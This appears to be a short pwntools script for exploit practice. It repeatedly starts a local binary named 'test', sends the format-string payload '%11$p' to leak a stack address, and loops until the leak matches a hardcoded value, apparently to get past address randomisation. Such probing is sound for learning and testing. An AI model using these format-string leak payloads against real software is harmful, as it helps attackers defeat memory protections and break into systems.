from pwn import *
elf = ELF("./test")
addr = b""
while addr != b"0x55e0c8bdf1d7":
	p = elf.process()
	p.sendline(b"%11$p")
	addr = p.recvall().replace(b"\n", b"")
	print(addr)
	p.close()
	time.sleep(1)
